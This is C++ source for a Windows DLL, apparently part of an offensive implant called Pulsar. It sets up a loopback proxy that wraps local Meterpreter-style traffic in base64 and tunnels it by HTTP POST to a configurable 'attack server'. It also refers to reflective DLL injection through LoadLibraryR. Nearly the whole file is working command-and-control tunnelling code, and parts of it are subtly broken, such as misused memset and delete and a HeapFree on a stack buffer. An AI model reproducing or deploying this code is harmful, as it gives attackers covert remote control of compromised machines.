// meterproxy.cpp : Defines the exported functions for the DLL application.
//

#include "stdafx.h"
#include "PulsarProxyLib.h"
#include "Pulsar.h"
#include "PulsarInternal.h"

PROXY_CONTEXT ProxyGlobalVars;


#pragma comment(lib, "winhttp.lib")

using namespace std;



BOOL InitializePulsarProxyConfig(unsigned short listenPort, WCHAR *attackServerHost, WCHAR *res, unsigned short attackServerPort) {
	
	g_meterproxy_config.listen_port = listenPort;
	g_meterproxy_config.attack_server_host = attackServerHost;
	g_meterproxy_config.remote_resource = res;
	g_meterproxy_config.attack_server_port = attackServerPort;

	g_meterproxy_config.proxy = NULL;
	g_meterproxy_config.proxy_bypass_list = NULL;
	g_meterproxy_config.auto_config_url = NULL;

	return TRUE;
}

BOOL meterproxy_config_add_encoder(ENCODER_FUNC encoder) {
	g_meterproxy_config.encoders.push_back(encoder);
	return TRUE;
}

BOOL meterproxy_config_add_decoder(DECODER_FUNC decoder) {
	g_meterproxy_config.decoders.push_back(decoder);
	return TRUE;
}

BOOL InitializeWinsock() {
	WSADATA wsaData;
	WORD wVer = MAKEWORD(2,2);    
	if (WSAStartup(wVer,&wsaData) != NO_ERROR)
		return false;
	if (LOBYTE( wsaData.wVersion ) != 2 || HIBYTE( wsaData.wVersion ) != 2 ) 
	{
		WSACleanup();
		return false;
	}
	return true;
}

int sendall(SOCKET s, char *buf, int *len) {
	int total = 0;
	int bytesleft = *len;
	int n=0;

	while (total < *len) {
		n = send(s, buf+total, bytesleft, 0);
		if (n == -1)
			break;
		total += n;
		bytesleft -= n;
	}

	*len = total;

	return n==-1 ? -1 : 0;
}

struct METERPROXY_REQUEST *meterproxy_request_init(SOCKET sock) {
	struct METERPROXY_REQUEST *mp_request = new struct METERPROXY_REQUEST;
	mp_request->sock = sock;
	mp_request->bStillReceiving = TRUE;
	mp_request->offset = 0;
	mp_request->request_data = NULL;
	mp_request->content_length = 0;
	return mp_request;
}

void meterproxy_request_destroy(struct METERPROXY_REQUEST *mp_request) {
	if (!mp_request)
		return;

	if (mp_request->request_data)
		delete [] mp_request->request_data;
	delete [] mp_request;
}

BOOL SendProxyData(BYTE *data_in, DWORD data_in_len, char **data_out, int *data_out_len) {
	HINTERNET hSession = NULL,
			  hConnect = NULL,
			  hRequest = NULL;
	BOOL bResults = FALSE;
	LPSTR pszOutBuffer;
	off_t offset = 0;
	DWORD dwSize = 0;
	DWORD dwDownloaded = 0;
	BOOL bSuccess = FALSE;

	DBGPrint("Called\n");

	hSession = WinHttpOpen(USER_AGENT,
						   g_meterproxy_config.dwProxyAccessType,
						   (LPCWSTR)g_meterproxy_config.proxy,
						   g_meterproxy_config.proxy_bypass_list,
						   0);
	
	if (!hSession){
		DBGPrint("hSession NULL\n");
		goto exit;
	}


	//Set the security flags
	SetHandleProtFlags(hSession);

	DBGPrint("g_mproxy.attack_server_host: %S port: %d\n", g_meterproxy_config.attack_server_host, g_meterproxy_config.attack_server_port);


	hConnect = WinHttpConnect(hSession, g_meterproxy_config.attack_server_host, g_meterproxy_config.attack_server_port, 0);
	if (!hConnect) {
		DBGPrint("hConnect NULL\n");
		goto exit;
	}


	hRequest = WinHttpOpenRequest(hConnect, L"POST", g_meterproxy_config.remote_resource, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,g_meterproxy_config.bMProxyFlags);
	if (!hRequest) {
		DBGPrint("hRequest NULL\n");
		goto exit;
	}
	else{
		// Set the redirection flags
		SetHandleRedirFlags(hRequest);

		// Set the security flags
		SetHandleCERTFlags(hRequest);
	}

	bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, (void *)data_in, data_in_len, data_in_len, NULL);
	if (!bResults) {
		DBGPrint("Send Request Failed: 0x%x\n", GetLastError());
		goto exit;
	}

	bResults = WinHttpReceiveResponse(hRequest, NULL);
	if (!bResults) {
		DBGPrint("Receive Response Failed: 0x%x\n", GetLastError());
		goto exit;
	}

	// Get the Content-Length header so we can allocate appropriately.
	WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_CONTENT_LENGTH, WINHTTP_HEADER_NAME_BY_INDEX, NULL, &dwSize, WINHTTP_NO_HEADER_INDEX);
	DWORD lastError = GetLastError();
	if (lastError == ERROR_INSUFFICIENT_BUFFER) {
		LPVOID lpOutBuffer = new WCHAR[dwSize/sizeof(WCHAR)];
		WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_CONTENT_LENGTH, WINHTTP_HEADER_NAME_BY_INDEX, lpOutBuffer, &dwSize, WINHTTP_NO_HEADER_INDEX);
		*data_out_len = _wtoi((const wchar_t *)lpOutBuffer);
		DBGPrint("Content-Length: %d\n", *data_out_len);
		delete [] lpOutBuffer;
	} else {
		DBGPrint("WinHttpQueryHeaders: %d\n", lastError);
		goto exit;
	}

	*data_out = new char[*data_out_len];

	do {
		dwSize = 0;
		if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
			DBGPrint("WinHttpQueryDataAvailable: %d\n", GetLastError());

		//DBGPrint("File size: %d\n", dwSize);

		pszOutBuffer = new char[dwSize+1];
		if (!pszOutBuffer) {
			DBGPrint("Out of memory\n");
			dwSize = 0;
		} else {
			// Read the data
			ZeroMemory(pszOutBuffer, dwSize+1);

			if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded))
				DBGPrint("Error %d in WinHttpReadData\n", GetLastError());

			RtlCopyMemory((char *)(*data_out+offset), pszOutBuffer, dwSize);
			offset += dwSize;

			delete []pszOutBuffer;
		}
	} while (dwSize > 0);

	DBGPrint("Data received: %d\n", offset);
	if (offset == *data_out_len)
		bSuccess = true;

exit:

	if (hRequest)
		WinHttpCloseHandle(hRequest);
	if (hConnect)
		WinHttpCloseHandle(hConnect);
	if (hSession)
		WinHttpCloseHandle(hSession);


	DBGPrint("Returning\n");


	return bSuccess;
}

BOOL sendRequest(struct METERPROXY_REQUEST *mp_request) {
	char *response = NULL;
	int responseLen = 0;

	// Iterate over the encoders
	BYTE *toEncode = mp_request->request_data;
	int toEncodeLen = mp_request->offset;
	BYTE *encodedData = NULL;
	int encodedLen = 0;

	for (std::vector<ENCODER_FUNC>::iterator it = g_meterproxy_config.encoders.begin(); it != g_meterproxy_config.encoders.end(); ++it) {
		ENCODER_FUNC encoder = *it;
		if (!encoder(toEncode, toEncodeLen, &encodedData, &encodedLen)) {
			DBGPrint("Failed to encode data\n");
			return FALSE;
		}

		// mp_request->request_data is cleaned up elsewhere
		if (toEncode != mp_request->request_data)
			delete [] toEncode;
		toEncode = encodedData;
		toEncodeLen = encodedLen;
	}

	// Now send it off the our counterpart on the server
	if (!SendProxyData(encodedData, encodedLen, &response, &responseLen)) {
		DBGPrint("SendProxyData failed\n");
		delete [] encodedData;
		return FALSE;
	}

	delete [] encodedData;

	if (responseLen > 0) {
		BYTE *toDecode = (BYTE *)response;
		int toDecodeLen = responseLen;
		BYTE *decodedData = NULL;
		int decodedLen = 0;

		for (std::vector<DECODER_FUNC>::iterator it = g_meterproxy_config.decoders.begin(); it != g_meterproxy_config.decoders.end(); ++it) {
			DECODER_FUNC decoder = *it;
			if (!decoder(toDecode, toDecodeLen, &decodedData, &decodedLen)) {
				DBGPrint("Failed to decode data\n");
				return FALSE;
			}

			delete [] toDecode;

			toDecode = decodedData;
			toDecodeLen = decodedLen;
		}

		if (sendall(mp_request->sock, (char *)decodedData, (int *)&decodedLen) == -1)
			DBGPrint("Failed to sendall(): %d\n", WSAGetLastError());

		if (decodedData)
			delete [] decodedData;
	}
	return TRUE;
}


#define TMP_BUF_SIZE 524288

void StartPulsarProxy() {



	if (!InitializeWinsock())
		return;

	fd_set master;
	fd_set read_fds;
	SOCKET fdmax;

	char buf[TMP_BUF_SIZE];
	//char *buf = NULL;
	int nbytes;
	std::map<int,struct METERPROXY_REQUEST *> meterproxy_requests;

	SOCKET listener_sock;
	struct sockaddr_in dest;	// Info on the client connecting to us
	struct sockaddr_in serv;	// Info about our listener
	int addrlen;
	SOCKET newfd;

	DBGPrint("Called\n");


	FD_ZERO(&master);
	FD_ZERO(&read_fds);

	listener_sock = socket(PF_INET, SOCK_STREAM, 0);
	if (listener_sock == INVALID_SOCKET) {
		DBGPrint("Failed socket(): %d\n", WSAGetLastError());
		return;
	}

	/*
	//Allocate our temporary buffer
	buf = (char *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, TMP_BUF_SIZE);
	if (!buf){
		DBGPrint("Failed to allocate temporary buffer\n");
		return;
	}
	*/

	memset(&serv, 0, sizeof(struct sockaddr_in));
	serv.sin_family = AF_INET;
	serv.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
	serv.sin_port = htons(g_meterproxy_config.listen_port);
	if (-1 == bind(listener_sock, (struct sockaddr *)&serv, sizeof(struct sockaddr))) {
		DBGPrint("Failed bind(): %d\n", WSAGetLastError());
		goto out;
	}

	if (-1 == listen(listener_sock, 5)) {
		DBGPrint("Failed listen(): %d\n", WSAGetLastError());
		goto out;
	}
	DBGPrint("Listening\n");

	FD_SET(listener_sock, &master);
	fdmax = listener_sock;

	for (;;) {
		read_fds = master;
		SOCKET available_fds = select(fdmax+1, &read_fds, NULL, NULL, NULL);
		if (available_fds == -1) {
			DBGPrint("Failed select(): %d\n", WSAGetLastError());
			goto out;
		} else if (available_fds == 0) {
			DBGPrint("select() timed out\n");
			continue;
		}


		for (int i = 0; i <= fdmax; i++) {
			if (FD_ISSET(i, &read_fds)) {
				if (i == listener_sock) {
					// New connection
					addrlen = sizeof(dest);
					newfd = accept(listener_sock, (struct sockaddr *)&dest, &addrlen);

					if (newfd == -1) {
						DBGPrint("Failed accept(): %d\n", WSAGetLastError());
					} else {
						FD_SET(newfd, &master);
						if (newfd > fdmax)
							fdmax = newfd;
						DBGPrint("New connection on socket %d\n", newfd);
						struct METERPROXY_REQUEST *mp_request = meterproxy_request_init(newfd);
						meterproxy_requests[newfd] = mp_request;
						//printf("New connection from %s on socket %d\n", InetNtop(dest.sin_family, get_in_addr((struct sockaddr *)&dest), remoteIP, INET6_ADDRSTRLEN), newfd);
					}
				} else {
					struct METERPROXY_REQUEST *mp_request = meterproxy_requests[i];
					DBGPrint("======= READ %d =======\n", i);
					// Handle data from a client

					// Read as much as it'll let us, but we only expect to get the headers.
					// Put the data into a buffer
					// Parse out the Content-Length header
					// Reallocate the buffer to the correct size
					// Continue receiving until we get the whole request
					//nbytes = recv(i, buf, sizeof(buf), 0);
					nbytes = recv(i, buf, TMP_BUF_SIZE, 0);
					DBGPrint("recv() complete. nbytes: %d\n", nbytes);
					if (nbytes == -1) {
						DBGPrint("Failed recv(): %d\n", WSAGetLastError());
						closesocket(i);
						FD_CLR(i, &master);
						meterproxy_requests[i] = NULL;
						meterproxy_request_destroy(mp_request);
					} else if (nbytes == 0) {
						DBGPrint("Client %d hung up\n", i);
						closesocket(i);
						FD_CLR(i, &master);
						meterproxy_requests[i] = NULL;
						meterproxy_request_destroy(mp_request);
					} else {
						buf[nbytes] = 0;
						DBGPrint("nbytes: %d\n", nbytes);
						DBGPrint("buf: %s\n", buf);


						if (!mp_request->request_data) {
							// Parse out the Content-Length header and allocate an appropriately-size buffer
							char *content_length_header = strstr(buf, "Content-Length: ");
							if (!content_length_header) {
								DBGPrint("NO CONTENT-LENGTH HEADER!\n");
								mp_request->request_data = new BYTE[nbytes+1];
								memset(mp_request->request_data, 0, sizeof(mp_request->request_data));
								// Presumably we've read everything available for this request.
								mp_request->bStillReceiving = FALSE;
							} else {
								content_length_header += strlen("Content-Length: ");
								// content_length_header now points to the first character of the header value
								mp_request->content_length = strtol(content_length_header, NULL, 10);
								DBGPrint("Content-Length: %d\n", mp_request->content_length);
								mp_request->request_data = new BYTE[mp_request->content_length+nbytes+1];
								memset(mp_request->request_data, 0, sizeof(mp_request->request_data));
							}
						}

						DBGPrint("request: %p offset: %d\n", mp_request->request_data, mp_request->offset);
						DBGPrint("request+offset: %p\n", mp_request->request_data + mp_request->offset);
						memcpy((void *)(mp_request->request_data+mp_request->offset), buf, nbytes);
						mp_request->offset += nbytes;
						DBGPrint("offset: %d\n", mp_request->offset);

						char *end_of_headers = strstr((char *)mp_request->request_data, "\r\n\r\n");
						if (!end_of_headers) {
							DBGPrint("Couldn't find end of headers!\n");
							for (;;) {}
						}
						char *body = end_of_headers+strlen("\r\n\r\n");
						*(body+mp_request->content_length) = 0;
						DBGPrint("Body length: %d\n", strlen(body));
						//DBGPrint("Body: %s\n", body);
						if (mp_request->request_data + mp_request->offset == (BYTE *)body + mp_request->content_length) {
							mp_request->bStillReceiving = FALSE;
						}

						DBGPrint("Still Receiving: %d\n", mp_request->bStillReceiving);
						if (!mp_request->bStillReceiving) {
							sendRequest(mp_request);

							DBGPrint("Destroying socket %d\n", i);
							closesocket(i);
							FD_CLR(i, &master);
							meterproxy_requests[i] = NULL;
							meterproxy_request_destroy(mp_request);
							DBGPrint("Destroyed socket %d\n", i);
						}
					}
					DBGPrint("======= END READ %d =======\n", i);
				}
			}
		}
	}
out:
	
	//Free the temporary buffer
	if (buf){
		HeapFree(GetProcessHeap(), 0, buf);
	}
	
	DBGPrint("Returning-Closing listener\n");
	closesocket(listener_sock);
}

VOID PulsarProxyInit (VOID) {

	DBGPrint("Called\n");

	//InitializePulsarProxyConfig(pulsar_context->pulsarproxy_port, pulsar_context->BeaconHost, pulsar_context->BeaconPort);

#ifndef PROXY_INCLUDED
	InitializeHttpSession();
#endif


	// Add encoders in the order that they should run. This will typically
	// be encryption, then compression, then something like base64.
	meterproxy_config_add_encoder(&base64Encoder);
	
	// Add decoders in the order that they should run. This will typically
	// be in reverse order from the encoders list.
	meterproxy_config_add_decoder(&base64Decoder);

	StartPulsarProxy();


	DBGPrint("Returning\n");
	return;

}


//
//
// Install the PulsarProxy and return a handle to its thread
//
//
HANDLE InstallPulsarProxy(USHORT LocalPort, PWCHAR lpRemoteHost, PWCHAR lpRemoteResource, USHORT RemotePort){

	HANDLE systemThreadHandle = NULL;

		//Set the global Proxy values
		ProxyGlobalVars.localPort = LocalPort;
		ProxyGlobalVars.remotePort = RemotePort;
		ProxyGlobalVars.remoteHost = lpRemoteHost;
		ProxyGlobalVars.remoteRes = lpRemoteResource;

		InitializePulsarProxyConfig(LocalPort, lpRemoteHost, lpRemoteResource,RemotePort);


#ifdef PROXY_INCLUDED
		//Load the proxy
		systemThreadHandle = CreateThread(
			NULL,
			0x100000,
			(LPTHREAD_START_ROUTINE)PulsarProxyInit,
			NULL,
			0,
			NULL);


		if (systemThreadHandle == NULL) {
			DBGPrint("Cannot create thread.");
			return NULL;
		}


#else
		//Inject Proxy
		LoadLibraryR(pulsar_context->metaproxy, pulsar_context->dwProxySize, &ProxyGlobalVars);
#endif



	return systemThreadHandle;

}